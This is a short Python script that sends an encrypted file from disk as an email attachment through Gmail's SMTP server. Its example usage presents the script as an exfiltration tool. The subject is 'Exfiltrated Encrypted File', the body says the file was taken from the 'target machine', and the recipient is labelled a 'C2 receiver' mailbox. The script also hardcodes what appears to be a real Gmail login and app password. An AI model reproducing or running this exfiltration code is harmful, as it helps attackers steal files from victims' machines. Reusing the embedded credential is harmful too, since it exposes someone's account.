import smtplib
from email.message import EmailMessage
import os

def send_email_with_attachment(
    sender_email, receiver_email, subject, body, 
    attachment_path, smtp_server, smtp_port, 
    login, password
):
    # Check if file exists
    if not os.path.exists(attachment_path):
        print(f"Error: File '{attachment_path}' not found.")
        return

    # Create the email message
    msg = EmailMessage()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = subject
    msg.set_content(body)

    # Read and attach the encrypted file
    with open(attachment_path, 'rb') as f:
        file_data = f.read()
        file_name = os.path.basename(attachment_path)

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

    # Connect to the SMTP server and send email
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Secure the connection
            server.login(login, password)
            server.send_message(msg)
            print(f"Email sent to {receiver_email} with attachment '{file_name}'.")
    except Exception as e:
        print("Error sending email:", e)

# Example usage
if __name__ == "__main__":
        send_email_with_attachment(
            sender_email="nnqq9629@gmail.com",        # Replace with your email
            receiver_email="receiverc76@gmail.com",# Replace with the C2 receiver email
            subject="Exfiltrated Encrypted File",
            body="This is the encrypted file sent from the target machine.",
            attachment_path="c:/Users/Test 1/Desktop/code/files.log.enc",     # Replace with your encrypted file path
            smtp_server="smtp.gmail.com",
            smtp_port=587,
            login="nnqq9629@gmail.com",               # Same as sender email
            password="fjunszcfgxeibwsk"                # Use app password, not your real password
        )